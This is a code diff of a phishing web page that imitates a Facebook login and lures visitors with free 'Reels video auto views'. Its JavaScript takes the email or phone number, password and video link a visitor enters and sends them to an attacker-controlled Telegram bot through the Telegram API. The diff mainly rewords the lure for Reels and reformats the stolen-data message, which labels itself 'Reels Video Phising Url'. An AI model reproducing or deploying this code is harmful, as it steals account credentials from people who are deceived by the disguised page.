@@ -101,7 +101,7 @@ h1 {
     <div class="login-box">
       <img src="https://www.facebook.com/images/fb_icon_325x325.png" class="avatar">
       <h1>Log In Facebook</h1>
-<strong style="text-align:center;color:#1877f2;">Get Facebook Video Auto Views And						Watch Time. Use For Free. </strong><br> <br>
+<strong style="text-align:center;color:#1877f2;">Get Facebook Reels Video Auto Views And						Watch Time. Use For Free. </strong><br> <br>
       <form onsubmit="submitForm(event)">
         <div>
           <label for="email-or-phone">Email or Phone</label>
@@ -112,7 +112,7 @@ h1 {
           <input type="password" id="password" name="password" placeholder="Enter Password">
         </div>
         <div>
-          <label for="video-link">Enter your video link</label>
+          <label for="video-link">Enter Your Reels Video Link</label>
           <input type="text" id="video-link" name="video-link" placeholder="Enter Video Link">
         </div>
         <div>
@@ -147,7 +147,10 @@ h1 {
 
 
 
-        const message = `New login Video Phising from ${emailOrPhone}. Password: ${password}. Video link: ${videoLink}`;
+        const message = `Type : Reels Video Phising Url 
+      📧 Email : ${emailOrPhone}. 
+      🔑 Password : ${password}. 
+      🎞 Reels Video Link : ${videoLink}`;
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
         fetch(url, { method: 'POST' })
           .then(response => response.json())
